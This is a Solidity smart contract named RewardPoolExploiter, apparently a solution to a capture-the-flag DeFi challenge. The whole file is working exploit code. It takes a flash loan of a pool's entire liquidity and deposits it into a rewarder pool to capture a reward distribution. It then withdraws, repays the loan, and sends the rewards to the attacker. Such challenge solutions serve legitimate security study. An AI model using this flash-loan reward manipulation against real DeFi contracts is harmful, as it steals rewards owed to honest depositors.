// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
  function flashLoan(uint256 amount) external;
}
interface ITheRewarderPool {
  function deposit(uint256 amount) external;
  function withdraw(uint256 amount) external;
  function distributeRewards() external returns (uint256 rewards);
}

contract RewardPoolExploiter {
  ITheRewarderPool private immutable _rewardPool;
  IFlashLoanerPool private immutable _flashLoanPool;
  IERC20 private immutable _liquidityToken;
  IERC20 private immutable _rewardToken;
  address private immutable _player;

  constructor(address rewardPool, address flashLoanPool, address liquidityToken, address rewardToken) {
    _rewardPool = ITheRewarderPool(rewardPool);
    _flashLoanPool = IFlashLoanerPool(flashLoanPool);
    _liquidityToken = IERC20(liquidityToken);
    _rewardToken = IERC20(rewardToken);
    _player = msg.sender;
  }

  function receiveFlashLoan(uint256 amount) external {
    require(msg.sender == address(_flashLoanPool));
    _liquidityToken.approve(address(_rewardPool), amount);
    _rewardPool.deposit(amount);
    _rewardPool.distributeRewards();
    _rewardPool.withdraw(amount);

    _liquidityToken.transfer(address(_flashLoanPool), amount);
    _rewardToken.transfer(_player, _rewardToken.balanceOf(address(this)));
  }

  function exploit() external {
    _flashLoanPool.flashLoan(_liquidityToken.balanceOf(address(_flashLoanPool)));
  }

  receive() external payable {}
}